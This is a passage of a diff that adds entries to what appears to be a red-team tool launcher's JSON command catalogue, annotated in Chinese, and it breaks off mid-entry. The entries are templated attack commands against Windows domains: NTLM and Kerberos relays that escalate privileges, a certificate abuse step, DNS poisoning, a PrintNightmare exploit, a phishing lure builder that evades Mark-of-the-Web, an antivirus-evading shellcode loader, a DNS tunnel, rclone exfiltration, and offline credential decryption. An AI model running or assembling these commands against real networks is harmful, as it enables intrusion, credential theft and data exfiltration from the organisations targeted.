+      "desc": "CVE-2022-33679:RC4 降级把 Kerberos 票据中继到 LDAP(长任务)",
+      "cmd": "krbrelayx -t ldap://{{dc}} -v {{victim}}",
+      "params": [
+        {
+          "k": "dc",
+          "l": "域控FQDN",
+          "req": 1
+        },
+        {
+          "k": "victim",
+          "l": "被劫持目标机器"
+        }
+      ],
+      "sudo": 1,
+      "bg": 1,
+      "timeout": 600,
+      "doc": "16 §1",
+      "noise": "高"
+    },
+    {
+      "id": "laps-v2",
+      "stage": "新打法",
+      "name": "LAPS v2 读取",
+      "desc": "nxc laps 模块,自动识别新旧 LAPS(msLAPS-EncryptedPassword)",
+      "cmd": "nxc ldap {{dcip}} -u {{user}} -p {{pass}} -M laps",
+      "params": [
+        {
+          "k": "dcip",
+          "l": "域控IP",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "有 LAPS 读取权用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        }
+      ],
+      "timeout": 120,
+      "readonly": true,
+      "doc": "16 §4",
+      "noise": "中"
+    },
+    {
+      "id": "certifried",
+      "stage": "新打法",
+      "name": "Certifried 机器户证书",
+      "desc": "CVE-2022-26923:Machine 模板拿 DC SAN 证书(需已控机器户)",
+      "cmd": "certipy req -u {{user}}@{{domain}} -p {{pass}} -ca {{ca}} -template Machine -dc-ip {{dcip}}",
+      "params": [
+        {
+          "k": "user",
+          "l": "机器账户(名$)",
+          "req": 1
+        },
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "机器户密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "ca",
+          "l": "CA名",
+          "req": 1
+        },
+        {
+          "k": "dcip",
+          "l": "域控IP",
+          "req": 1
+        }
+      ],
+      "danger": 1,
+      "timeout": 300,
+      "doc": "16 §3",
+      "noise": "高"
+    },
+    {
+      "id": "relay-ldap-delegate",
+      "stage": "中继矩阵",
+      "name": "中继→LDAPS·RBCD 委派",
+      "desc": "ntlmrelayx 挂起等认证,来即对来者机器配 RBCD(长任务)",
+      "cmd": "impacket-ntlmrelayx -t ldaps://{{dc}} --delegate-access --no-smb2support 2>/dev/null || impacket-ntlmrelayx -t ldaps://{{dc}} --delegate-access",
+      "params": [
+        {
+          "k": "dc",
+          "l": "域控FQDN",
+          "req": 1
+        }
+      ],
+      "sudo": 1,
+      "bg": 1,
+      "timeout": 900,
+      "doc": "10 §1.5",
+      "noise": "高"
+    },
+    {
+      "id": "relay-ldap-escalate",
+      "stage": "中继矩阵",
+      "name": "中继→LDAP·拔权",
+      "desc": "来者认证被中继后直接给指定用户加高权(长任务)",
+      "cmd": "impacket-ntlmrelayx -t ldap://{{dc}} --escalate-user {{user}}",
+      "params": [
+        {
+          "k": "dc",
+          "l": "域控FQDN",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "要拔高的低权用户",
+          "req": 1
+        }
+      ],
+      "sudo": 1,
+      "bg": 1,
+      "timeout": 900,
+      "doc": "10 §1.5",
+      "noise": "高"
+    },
+    {
+      "id": "relay-dump",
+      "stage": "中继矩阵",
+      "name": "中继即倾泻",
+      "desc": "来一次认证就 dump LAPS/gMSA/ADCS 一条龙(长任务)",
+      "cmd": "impacket-ntlmrelayx -t ldap://{{dc}} --dump-laps --dump-gmsa --dump-adcs",
+      "params": [
+        {
+          "k": "dc",
+          "l": "域控FQDN",
+          "req": 1
+        }
+      ],
+      "sudo": 1,
+      "bg": 1,
+      "timeout": 900,
+      "doc": "10 §1.5",
+      "noise": "高"
+    },
+    {
+      "id": "relay-ca-certipy",
+      "stage": "中继矩阵",
+      "name": "certipy relay→CA",
+      "desc": "ESC8 一体化:中继+申请 DomainController 证书(长任务)",
+      "cmd": "certipy relay -target http://{{caip}} -template DomainController",
+      "params": [
+        {
+          "k": "caip",
+          "l": "CA主机(FQDN/IP)",
+          "req": 1
+        }
+      ],
+      "sudo": 1,
+      "bg": 1,
+      "timeout": 900,
+      "doc": "11 ESC8",
+      "noise": "高"
+    },
+    {
+      "id": "coercer-scan",
+      "stage": "中继矩阵",
+      "name": "coercer 强制源探测",
+      "desc": "二十余种认证强制方法逐一探测(喂中继)",
+      "cmd": "coercer scan -t {{target}} -l {{me}} -u {{user}} -p {{pass}} -d {{domain}}",
+      "params": [
+        {
+          "k": "target",
+          "l": "目标机器IP",
+          "req": 1
+        },
+        {
+          "k": "me",
+          "l": "本机IP",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "域用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        }
+      ],
+      "timeout": 300,
+      "readonly": true,
+      "doc": "11 ESC8",
+      "noise": "中"
+    },
+    {
+      "id": "coercer-coerce",
+      "stage": "中继矩阵",
+      "name": "coercer 全方法触发",
+      "desc": "任一方法命中即触发目标向本机认证",
+      "cmd": "coercer coerce --auth-type smb -t {{target}} -l {{me}} -u {{user}} -p {{pass}} -d {{domain}}",
+      "params": [
+        {
+          "k": "target",
+          "l": "目标机器IP",
+          "req": 1
+        },
+        {
+          "k": "me",
+          "l": "本机IP(中继监听地址)",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "域用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        }
+      ],
+      "danger": 1,
+      "timeout": 300,
+      "doc": "11 ESC8",
+      "noise": "高"
+    },
+    {
+      "id": "adidns-wildcard",
+      "stage": "中继矩阵",
+      "name": "ADIDNS 通配符投毒",
+      "desc": "dnstool 加 *.域名 A 记录→全域名解析到本机(配 responder 抓)",
+      "cmd": "dnstool -u {{domain}}\\{{user}} -p {{pass}} -r '*.'{{domain}} --action add --data {{meip}} --allow-multiple {{dcip}}",
+      "params": [
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "有 DNS 写权限用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "meip",
+          "l": "本机IP",
+          "req": 1
+        },
+        {
+          "k": "dcip",
+          "l": "域控IP",
+          "req": 1
+        }
+      ],
+      "danger": 1,
+      "timeout": 120,
+      "doc": "10 §1.5",
+      "noise": "高"
+    },
+    {
+      "id": "nxc-sessions",
+      "stage": "中继矩阵",
+      "name": "在线会话狩猎",
+      "desc": "实时找域管正登录在哪台机器(横向直击)",
+      "cmd": "nxc smb {{target}} -u {{user}} -p {{pass}} --sessions --loggedon-users",
+      "params": [
+        {
+          "k": "target",
+          "l": "目标(IP/CIDR)",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "域用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        }
+      ],
+      "timeout": 300,
+      "readonly": true,
+      "doc": "10 §1.5",
+      "noise": "中"
+    },
+    {
+      "id": "printnightmare",
+      "stage": "中继矩阵",
+      "name": "PrintNightmare RCE",
+      "desc": "CVE-2021-1675:Spooler 远程 DLL 注入(2021-06 前补丁)",
+      "cmd": "msfconsole -q -x 'use exploit/windows/dcerpc/cve_2021_1675_printnightmare; set RHOSTS {{target}}; set SMBUser {{user}}; set SMBPass {{pass}}; set LHOST {{me}}; run -j; exit'",
+      "params": [
+        {
+          "k": "target",
+          "l": "目标机器IP",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "域用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "me",
+          "l": "本机回连IP",
+          "req": 1
+        }
+      ],
+      "danger": 1,
+      "timeout": 900,
+      "doc": "10 §4.4",
+      "noise": "高"
+    },
+    {
+      "id": "make-lure",
+      "stage": "钓鱼入口",
+      "name": "投递物三件套",
+      "desc": "payload→ISO(绕MotW)+LNK(PDF伪装)+VBA宏模板",
+      "cmd": "~/tools/bin/make-lure.sh {{payload}}",
+      "params": [
+        {
+          "k": "payload",
+          "l": "payload 路径(exe,建议 sliver generate 产物)",
+          "req": 1,
+          "def": "/tmp/payload.exe"
+        }
+      ],
+      "timeout": 120,
+      "readonly": true,
+      "doc": "18 §3",
+      "noise": "低"
+    },
+    {
+      "id": "gen-wordlists",
+      "stage": "钓鱼入口",
+      "name": "喷洒字典生成",
+      "desc": "项目域→公司词根×年季×后缀 1248 变体+users汇聚",
+      "cmd": "PROJ_DIR=${PROJ_DIR:-$HOME/tools/projects/default} ~/tools/bin/gen-wordlists.sh {{domain}}",
+      "params": [
+        {
+          "k": "domain",
+          "l": "域名(无项目时必填)"
+        }
+      ],
+      "timeout": 60,
+      "readonly": true,
+      "doc": "TRICKS",
+      "noise": "低"
+    },
+    {
+      "id": "gophish-launch",
+      "stage": "钓鱼入口",
+      "name": "GoPhish 启动",
+      "desc": "钓鱼平台(https://127.0.0.1:3333,首启输出随机密码)",
+      "cmd": "sudo gophish-start; sleep 6; journalctl -u gophish --no-pager -n 12 2>/dev/null | grep -iE 'admin|password|https' || true",
+      "params": [],
+      "sudo": 1,
+      "timeout": 60,
+      "doc": "18 §4",
+      "noise": "低"
+    },
+    {
+      "id": "sccm-find",
+      "stage": "SCCM",
+      "name": "SCCM 站点发现",
+      "desc": "定位站点服务器/NAF/MP(SCCM 环境入口)",
+      "cmd": "sccmhunter find -u {{user}} -p {{pass}} -d {{domain}} -dc-ip {{dcip}} -dns-suffix {{domain}}",
+      "params": [
+        {
+          "k": "user",
+          "l": "域用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "dcip",
+          "l": "域控IP",
+          "req": 1
+        }
+      ],
+      "timeout": 300,
+      "readonly": true,
+      "doc": "19",
+      "noise": "中"
+    },
+    {
+      "id": "sccm-smb",
+      "stage": "SCCM",
+      "name": "SCCM SMB 中继",
+      "desc": "NAA/PUSH 账户中继入口(经典 SCCM 客户端打点链第一步)",
+      "cmd": "sccmhunter smbrelay -u {{user}} -p {{pass}} -d {{domain}} -dc-ip {{dcip}}",
+      "params": [
+        {
+          "k": "user",
+          "l": "域用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "dcip",
+          "l": "域控IP",
+          "req": 1
+        }
+      ],
+      "danger": 1,
+      "timeout": 600,
+      "doc": "19",
+      "noise": "高"
+    },
+    {
+      "id": "shhhloader",
+      "stage": "免杀/渗出",
+      "name": "Shhhloader 加载器",
+      "desc": "raw shellcode→直接系统调用加密加载器(unhook/PPID欺骗/沙箱逃逸)",
+      "cmd": "cd ~/tools/src/Shhhloader && python3 Shhhloader.py -i {{scfile}} --method {{method}} -o {{outfile}}",
+      "params": [
+        {
+          "k": "scfile",
+          "l": "raw shellcode 文件(sliver generate --format c→自转bin)",
+          "req": 1,
+          "def": "/tmp/sc.bin"
+        },
+        {
+          "k": "method",
+          "l": "注入方法",
+          "req": 1,
+          "def": "Syscalls"
+        },
+        {
+          "k": "outfile",
+          "l": "输出路径",
+          "req": 1,
+          "def": "/tmp/loader.exe"
+        }
+      ],
+      "timeout": 300,
+      "readonly": true,
+      "doc": "20 §2",
+      "noise": "低"
+    },
+    {
+      "id": "yakit",
+      "stage": "免杀/渗出",
+      "name": "Yakit 启动",
+      "desc": "一体化安全测试平台 GUI(MITM/fuzz/插件生态)",
+      "cmd": "nohup ~/tools/bin/Yakit.AppImage --no-sandbox >/dev/null 2>&1 & sleep 2; pgrep -f Yakit >/dev/null && echo 'Yakit 已启动(GUI 桌面查看)' || echo '启动失败(需图形桌面)'",
+      "params": [],
+      "timeout": 30,
+      "doc": "20 §3",
+      "noise": "低"
+    },
+    {
+      "id": "dnscat2",
+      "stage": "免杀/渗出",
+      "name": "dnscat2 DNS 隧道服务端",
+      "desc": "DNS 隧道控制通道(长任务;客户端 dnscat.exe 目标侧)",
+      "cmd": "dnscat2-server --dns port=53,domain={{domain}}",
+      "params": [
+        {
+          "k": "domain",
+          "l": "隧道域名(NS 指向本机)",
+          "req": 1,
+          "def": "t.example.com"
+        }
+      ],
+      "sudo": 1,
+      "bg": 1,
+      "timeout": 900,
+      "doc": "21 §2",
+      "noise": "中"
+    },
+    {
+      "id": "rclone-exfil",
+      "stage": "免杀/渗出",
+      "name": "rclone 加密外传",
+      "desc": "AES 加密打包到云盘/远程(走对象存储中转)",
+      "cmd": "~/tools/bin/rclone copy {{src}} {{remote}}:{{bucket}} --transfers 4 --checkers 8 -P",
+      "params": [
+        {
+          "k": "src",
+          "l": "要传的目录/文件",
+          "req": 1
+        },
+        {
+          "k": "remote",
+          "l": "rclone 远程名(先 rclone config)",
+          "req": 1,
+          "def": "mydrive"
+        },
+        {
+          "k": "bucket",
+          "l": "目标路径",
+          "req": 1,
+          "def": "exfil"
+        }
+      ],
+      "danger": 1,
+      "timeout": 1800,
+      "doc": "21 §3",
+      "noise": "高"
+    },
+    {
+      "id": "hashcat-queue",
+      "stage": "免杀/渗出",
+      "name": "破解队列一把跑",
+      "desc": "项目 hashqueue.txt 按 asrep/tgs 前缀自动分流双模式;无 GPU 自动走 john",
+      "cmd": "Q=${PROJ_DIR:-$HOME/tools/loot}/hashqueue.txt; [ -f \"$Q\" ] || { echo '队列空(先跑收割类工具)'; exit 1; }; grep -F '$krb5asrep' \"$Q\" | sort -u > /tmp/asq.txt; grep -F '$krb5tgs' \"$Q\" | grep -F '$krb5tgs$23$' | sort -u > /tmp/tgq.txt; echo '== AS-REP('$(wc -l < /tmp/asq.txt)'条) =='; [ -s /tmp/asq.txt ] && hashcat -m 18200 /tmp/asq.txt /usr/share/wordlists/rockyou.txt -O --show | head; [ -s /tmp/asq.txt ] && hashcat -m 18200 /tmp/asq.txt /usr/share/wordlists/rockyou.txt -O --force; echo '== Kerberoast RC4('$(wc -l < /tmp/tgq.txt)'条) =='; [ -s /tmp/tgq.txt ] && hashcat -m 13100 /tmp/tgq.txt /usr/share/wordlists/rockyou.txt -O --show | head; [ -s /tmp/tgq.txt ] && hashcat -m 13100 /tmp/tgq.txt /usr/share/wordlists/rockyou.txt -O --force; if ! hashcat -I >/dev/null 2>&1; then echo '[!] hashcat 无计算后端(VM 无 GPU/OpenCL)→ john CPU 兜底'; [ -s /tmp/asq.txt ] && john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt /tmp/asq.txt; [ -s /tmp/tgq.txt ] && john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt /tmp/tgq.txt; fi",
+      "params": [],
+      "timeout": 3600,
+      "bg": 1,
+      "readonly": true,
+      "doc": "10 §1.5",
+      "noise": "低"
+    },
+    {
+      "id": "trust-map",
+      "stage": "阶段1 域外",
+      "name": "trust-map 信任拓扑测绘",
+      "desc": "遍历项目全部域,枚举信任,产出拓扑图(txt+mermaid)",
+      "cmd": "PROJ_DIR=${PROJ_DIR:-} ~/tools/bin/trust-map.sh {{user}} {{pass}}",
+      "params": [
+        {
+          "k": "user",
+          "l": "任一域有效用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        }
+      ],
+      "timeout": 300,
+      "readonly": true,
+      "doc": "25 §1",
+      "noise": "中"
+    },
+    {
+      "id": "multi-bh",
+      "stage": "阶段2 立足",
+      "name": "多域循环 BH 采集",
+      "desc": "项目所有域各采一次 bloodhound-python(产物按域分目录)",
+      "cmd": "for d in $(python3 -c \"import json;p=json.load(open('${PROJ_DIR:-$HOME/tools/projects/x}/project.json'));print(' '.join(x['name']+','+x.get('dcip','') for x in p.get('domains',[])))\" 2>/dev/null); do IFS=, read -r dom dcip <<< \"$d\"; echo \"== 采集 $dom ==\"; bloodhound-python -u {{user}} -p {{pass}} -d $dom -ns $dcip -c All --zip; done; ls *_bloodhound*.zip 2>/dev/null || echo 无产物(检查域档案)",
+      "params": [
+        {
+          "k": "user",
+          "l": "域用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        }
+      ],
+      "timeout": 1800,
+      "readonly": true,
+      "doc": "25 §5",
+      "noise": "中"
+    },
+    {
+      "id": "bh-diff",
+      "stage": "运维",
+      "name": "BH 采集差异",
+      "desc": "两次 bloodhound-python 产物对比:新增实体/高权标记变化/信任变化",
+      "cmd": "python3 ~/tools/bin/bh-diff.py {{old}} {{new}}",
+      "params": [
+        {
+          "k": "old",
+          "l": "旧采集目录/zip",
+          "req": 1
+        },
+        {
+          "k": "new",
+          "l": "新采集目录/zip",
+          "req": 1
+        }
+      ],
+      "timeout": 120,
+      "readonly": true,
+      "doc": "10 §2.2",
+      "noise": "低"
+    },
+    {
+      "id": "selfcheck",
+      "stage": "运维",
+      "name": "环境自检",
+      "desc": "30+ 核心工具存在性检查(无危险)",
+      "cmd": "for c in nmap msfconsole sqlmap hashcat john hydra nuclei nxc ffuf searchsploit evil-winrm impacket-secretsdump bloodhound fscan ligolo_proxy sliver-server certipy coercer bloodhound-python ldapdomaindump kinit ruler krbrelayx shhhloader rclone dnscat2-server; do command -v $c >/dev/null && echo OK $c || echo MISS $c; done",
+      "params": [],
+      "timeout": 60,
+      "readonly": true,
+      "doc": "99",
+      "noise": "低"
+    },
+    {
+      "id": "svc-status",
+      "stage": "运维",
+      "name": "服务状态",
+      "desc": "BH/Neo4j/BeEF/GoPhish/msf-postgres 状态",
+      "cmd": "systemctl is-active bloodhound neo4j 2>/dev/null; pg_isready 2>/dev/null; systemctl is-active beef-xss gophish 2>/dev/null || true",
+      "params": [],
+      "timeout": 30,
+      "readonly": true,
+      "doc": "99",
+      "noise": "低"
+    },
+    {
+      "id": "firepwd",
+      "stage": "阶段3 横向",
+      "name": "Firefox 密码解密",
+      "desc": "logins.json+key4.db 拖回后本地解密(firepwd)",
+      "cmd": "python3 ~/tools/src/firepwd/firepwd.py {{dir}}",
+      "params": [
+        {
+          "k": "dir",
+          "l": "含 logins.json/key4.db 的目录",
+          "req": 1,
+          "def": "./"
+        }
+      ],
+      "timeout": 120,
+      "readonly": true,
+      "doc": "26 §4",
+      "noise": "低"
+    },
+    {
+      "id": "win-trace",
+      "stage": "阶段3 横向",
+      "name": "Windows 连接溯源",
+      "desc": "谁连过来(netstat/net sessions)+连过谁(RDP注册表历史)+ARP,WMI 远程一键",
+      "cmd": "nxc smb {{target}} -u {{user}} -p {{pass}} -X \"cmd.exe /c \\\"echo ==当前连接== & netstat -ano -p tcp | findstr ESTABLISHED & echo ==ARP缓存== & arp -a & echo ==SMB会话来源== & net sessions & echo ==RDP连过的主机(注册表历史)== & reg query \\\\\"HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers\\\\\" /s 2>nul | findstr /i \\\\\"SERVER UserSpecific\\\\\"\\\"\"",
+      "params": [
+        {
+          "k": "target",
+          "l": "目标IP",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "管理员账户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        }
+      ],
+      "timeout": 300,
+      "readonly": true,
+      "doc": "26 §8",
+      "noise": "中"
+    },
+    {
+      "id": "lin-trace",
+      "stage": "阶段3 横向",
+      "name": "Linux 连接溯源",
+      "desc": "last/lastb 来源IP+ss 当前+known_hosts/bash_history 连过谁+ARP",
+      "cmd": "sshpass -p {{pass}} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 {{user}}@{{target}} 'echo ==谁连过来(last)==; last -F -a | head -20; echo ==谁连过来(失败)==; lastb -a 2>/dev/null | head -10; echo ==当前连接==; ss -tnp 2>/dev/null | head -20; echo ==连过哪些IP(known_hosts)==; cat ~/.ssh/known_hosts 2>/dev/null | awk '\\''{print $1}'\\'' | sort -u; echo ==连过哪些IP(history里的ssh)==; grep -hE '\\''ssh|scp'\\'' ~/.bash_history ~/.zsh_history 2>/dev/null | grep -oE '\\''[0-9]{1,3}(\\.[0-9]{1,3}){3}'\\'' | sort -u; echo ==ARP==; ip neigh 2>/dev/null | head -10'",
+      "params": [
+        {
+          "k": "target",
+          "l": "目标IP",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "用户(root 最佳)",
+          "req": 1,
+          "def": "root"
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        }
+      ],
+      "timeout": 300,
+      "readonly": true,
+      "doc": "26 §8",
+      "noise": "中"
+    },
+    {
+      "id": "file-hunt",
+      "stage": "阶段2 立足",
+      "name": "敏感文件定向搜索",
+      "desc": "spider_plus 递归共享→按关键词过滤(密码/账密/拓扑/VPN)",
+      "cmd": "nxc smb {{target}} -u {{user}} -p {{pass}} -M spider_plus -o EXCLUDE_EXTS={{exts}} DOWNLOAD_FLAG={{dl}} MAX_FILE_SIZE=999kb; echo '→ JSON 已存 ~/tools/loot*/spider_plus/,文件名含 密码/pass/vpn/拓扑/cred/backup 的在上面结果里人工复核'",
+      "params": [
+        {
+          "k": "target",
+          "l": "目标(IP/CIDR)",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "域用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "exts",
+          "l": "排除扩展名",
+          "def": "dll,exe,sys,msi,ico,lnk"
+        },
+        {
+          "k": "dl",
+          "l": "下载小文件",
+          "def": "false"
+        }
+      ],
+      "timeout": 900,
+      "readonly": true,
+      "doc": "27 §4",
+      "noise": "中"
+    },
+    {
+      "id": "keytab-check",
+      "stage": "阶段3 横向",
+      "name": "Linux keytab 三连",
+      "desc": "klist -kt 主体→klist -k -K 连密钥→SSSD 缓存探察(域内 Linux 凭据源)",
+      "cmd": "sshpass -p {{pass}} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 {{user}}@{{target}} 'echo ==keytab主体==; klist -kt /etc/krb5.keytab 2>/dev/null || sudo -n klist -kt /etc/krb5.keytab 2>/dev/null || echo 无keytab或需root; echo ==SSSD==; ls /var/lib/sss/secrets.ldb 2>/dev/null && echo SSSD缓存在(提取见27号) || echo 无SSSD; echo ==sudo==; sudo -n -l 2>/dev/null | head -8'",
+      "params": [
+        {
+          "k": "target",
+          "l": "Linux机器IP",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "用户",
+          "req": 1,
+          "def": "root"
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        }
+      ],
+      "timeout": 120,
+      "readonly": true,
+      "doc": "27 §1",
+      "noise": "低"
+    },
+    {
+      "id": "netcheck",
+      "stage": "阶段0 准备",
+      "name": "网络质量检测",
+      "desc": "延迟/丢包/类型→自适应超时建议(工具前置探针)",
+      "cmd": "~/tools/bin/netcheck.sh {{target}}",
+      "params": [
+        {
+          "k": "target",
+          "l": "目标IP",
+          "req": 1
+        }
+      ],
+      "timeout": 30,
+      "readonly": true,
+      "doc": "autopwn",
+      "noise": "低"
+    },
+    {
+      "id": "bh-path",
+      "stage": "阶段2 立足",
+      "name": "BH 最短路径建议",
+      "desc": "BH CE 最短路径到高价值组(DA/EA)→ 中文动作建议(影子凭据/RBCD/入组/DCSync…)",
+      "cmd": "~/tools/bin/bh-path.py {{target}}",
+      "params": [
+        {
+          "k": "target",
+          "l": "高价值目标组(可空)",
+          "def": "DOMAIN ADMINS"
+        }
+      ],
+      "timeout": 60,
+      "readonly": true,
+      "noise": "低",
+      "doc": "05 §4"
+    },
+    {
+      "id": "persist-audit",
+      "stage": "阶段5 维持",
+      "name": "持久化检测面审计",
+      "desc": "AdminSDHolder/影子凭据/非约束委派/krbtgt重置周期 四条只读 LDAP 查询,汇总行自动登记 finding",
+      "cmd": "~/tools/bin/persist-audit.sh {{dcip}} {{domain}} {{user}} {{pass}}",
+      "params": [
+        {
+          "k": "dcip",
+          "l": "域控IP",
+          "req": 1
+        },
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "域用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        }
+      ],
+      "timeout": 300,
+      "readonly": true,
+      "doc": "17 §9",
+      "noise": "低"
+    },
+    {
+      "id": "mssql-exec",
+      "stage": "阶段3 横向",
+      "name": "MSSQL 命令执行",
+      "desc": "nxc mssql xp_cmdshell 执行单条命令",
+      "cmd": "nxc mssql {{target}} -u {{user}} -p {{pass}} -d {{domain}} -x {{cmd}}",
+      "params": [
+        {
+          "k": "target",
+          "l": "MSSQL 主机",
+          "req": 1
+        },
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "cmd",
+          "l": "命令",
+          "req": 1,
+          "def": "whoami"
+        }
+      ],
+      "timeout": 90,
+      "danger": true,
+      "noise": "中",
+      "doc": "14 §1"
+    },
+    {
+      "id": "s4u",
+      "stage": "阶段4 域控",
+      "name": "S4U 约束委托取票",
+      "desc": "S4U2Self+S4U2Proxy 模拟任意用户取目标服务票",
+      "cmd": "impacket-getST -spn {{spn}} -impersonate {{imp}} -dc-ip {{dcip}} '{{domain}}/{{user}}:{{pass}}'",
+      "params": [
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "委托账户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "spn",
+          "l": "目标SPN",
+          "req": 1,
+          "def": "cifs/"
+        },
+        {
+          "k": "imp",
+          "l": "模拟用户",
+          "req": 1,
+          "def": "administrator"
+        },
+        {
+          "k": "dcip",
+          "l": "DC IP",
+          "req": 1
+        }
+      ],
+      "timeout": 90,
+      "danger": true,
+      "noise": "低",
+      "doc": "12 §3"
+    },
+    {
+      "id": "pre2k-check",
+      "stage": "阶段 1 打点",
+      "name": "pre2k 计算机弱口令",
+      "desc": "pre-2000 兼容计算机账户: 密码=机器名小写, 命中即机器账户凭据(可 RBCD/中继)",
+      "cmd": "~/tools/bin/pre2k.sh {{dcip}} {{domain}} {{user}} {{pass}}",
+      "params": [
+        {
+          "k": "dcip",
+          "l": "域控 IP",
+          "req": 1
+        },
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "用户名",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        }
+      ],
+      "risk": "低",
+      "timeout": 120,
+      "danger": false
+    },
+    {
+      "id": "dpapi-masterkey",
+      "stage": "阶段 5 收割",
+      "name": "DPAPI 主密钥离线解",
+      "desc": "用域用户密码+SID 离线解 masterkey(凭据收割/浏览器凭据前置)",
+      "cmd": "impacket-dpapi masterkey -file {{mkfile}} -password {{pass}} -sid {{sid}}",
+      "params": [
+        {
+          "k": "mkfile",
+          "l": "masterkey 文件路径",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "sid",
+          "l": "用户 SID",
+          "req": 1
+        }
+      ],
+      "risk": "低",
+      "timeout": 30,
+      "danger": false
+    },
+    {
+      "id": "dpapi-credential",
+      "stage": "阶段 5 收割",
+      "name": "DPAPI 凭据库离线解",
+      "desc": "masterkey(hex) 解 credential/vault blob: 浏览器/WiFi/RDP 保存的明文",
+      "cmd": "impacket-dpapi credential -file {{blob}} -key {{mkhex}}",
+      "params": [
+        {
+          "k": "blob",
+          "l": "credential/vault 文件",
+          "req": 1
+        },
+        {
+          "k": "mkhex",
+          "l": "masterkey(hex)",
+          "req": 1
+        }
+      ],
+      "risk": "低",
+      "timeout": 30,
+      "danger": false
+    },
+    {
+      "id": "wg-probe",
+      "stage": "阶段 2 凭据",
+      "name": "工作组横向探测",
+      "desc": "本地管理员凭据对 SMB/WinRM 双协议试通;非 RID500 本地账户需目标开 LocalAccountTokenFilterPolicy=1,否则密码对也拒绝(唯一横向前置坑)",
+      "cmd": "netexec smb {{target}} -u {{user}} -p {{pass}} --local-auth; netexec winrm {{target}} -u {{user}} -p {{pass}} --local-auth",
+      "params": [
+        {
+          "k": "target",
+          "l": "目标 IP",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "用户名",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        }
+      ],
+      "risk": "低",
+      "timeout": 60,
+      "danger": false
+    },
+    {
+      "id": "win-run",
+      "stage": "阶段 3 横向",
+      "name": "Win Agent 执行(回读免疫)",
+      "desc": "任务计划保活触发+SMB结果文件回读: 根治高延迟链路 atexec Run/Delete 竞态与 psexec 管道挂起;SYSTEM 权限;密码填 - 走 KRB5CCNAME 票",
+      "cmd": "python3 ~/tools/bin/win-exec.py {{domuser}} {{pass}} {{target}} {{rcmd}}",
+      "params": [
+        {
+          "k": "target",
+          "l": "目标FQDN",
+          "req": 1
+        },
+        {
+          "k": "domuser",
+          "l": "域/用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码(-=用票)",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "rcmd",
